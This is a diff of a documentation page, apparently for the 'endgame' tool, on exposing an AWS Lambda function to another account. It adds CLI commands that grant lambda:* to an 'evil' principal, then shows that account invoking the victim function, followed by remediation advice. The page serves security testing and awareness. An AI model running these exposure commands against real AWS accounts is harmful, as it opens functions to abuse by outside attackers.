@@ -1,30 +1,47 @@
-# Lambda Functions
+# Lambda Function Cross-Account Access
 
-Allows invoking the Lambda Function.
+AWS Lambda Permission Policies (aka resource-based policies) can allow functions to be invoked from AWS accounts other than the one it is running in.
+
+Compromised Lambda functions are a known attack path for [Privilege Escalation](https://resources.infosecinstitute.com/topic/cloudgoat-walkthrough-lambda-privilege-escalation/) and other nefarious use cases. While the impact often depends on the context of the Lambdas itself, Lambda functions often modify AWS infrastructure or have data plane access. Abusing these capabilities could compromise the confidentiality and integrity of the resources in the account.
+
+Existing Exploitation tools such as [Pacu](https://github.com/RhinoSecurityLabs/pacu) have capabilities that help attackers exploit compromised Lambda functions. Pacu, for example, has modules that leverage Lambda functions to [backdoor new IAM roles](https://github.com/RhinoSecurityLabs/pacu/tree/master/modules/lambda__backdoor_new_roles), to [modify security groups](https://github.com/RhinoSecurityLabs/pacu/tree/master/modules/lambda__backdoor_new_sec_groups), and to [create new IAM users](https://github.com/RhinoSecurityLabs/pacu/tree/master/modules/lambda__backdoor_new_users). As such, Lambda functions are high-value targets to attackers, and existing exploitation frameworks such as Pacu and others increase the likelihood for abuse when a Lambda function is compromised.
 
 ## Steps to Reproduce
 
-* Using `endgame`:
+* **Option 1**: To expose the Lambda function using `endgame`:
 
-* Using AWS CLI:
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+endgame expose --service lambda --name test-resource-exposure
+```
+
+* **Option 2**: To expose the Lambda Function using AWS CLI:
 
 ```bash
 export EVIL_PRINCIPAL_ACCOUNT=999988887777
 aws lambda add-permission \
     --function-name test-resource-exposure \
     --action lambda:* \
-    --statement-id RbpExposer \
+    --statement-id Endgame \
     --principal $EVIL_PRINCIPAL_ACCOUNT
 ```
 
-## Example: Exposed Resource
+* To view the contents of the exposed resource policy, run the following:
+
+```bash
+aws lambda get-policy --function-name test-resource-exposure
+```
+
+* Observe that the contents of the exposed resource policy match the example shown below.
+
+## Example
 
 ```json
 {
   "Version": "2012-10-17",
   "Statement": [
     {
-      "Sid": "RbpExposer",
+      "Sid": "Endgame",
       "Effect": "Allow",
       "Principal": {
         "AWS": "999988887777"
@@ -38,8 +55,33 @@ aws lambda add-permission \
 }
 ```
 
+## Exploitation
+
+* Authenticate to the `evil` account (In this example, `arn:aws:iam::999988887777:user/evil`)
+
+* Run the following command to invoke the function in the victim account:
+
+```bash
+export VICTIM_LAMBDA=arn:aws:lambda:us-east-1:111122223333:test-resource-exposure
+aws lambda invoke --function-name $VICTIM_LAMBDA
+```
+
+* Observe that the output resembles the following:
+
+```json
+{
+    "ExecutedVersion": "$LATEST",
+    "StatusCode": 200
+}
+```
+
 ## Remediation
+
+* Ensure that cross-account Lambda functions allow access only to trusted accounts to prevent unknown function invocation requests
+* Leverage AWS Access Analyzer to report on external access to Lambda Functions. See [the AWS Access Analyzer documentation](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda) for more details.
+
 
 ## References
 
 * [add-permission](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/add-permission.html)
+* [Access Analyzer support for AWS Lambda Functions](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-lambda)
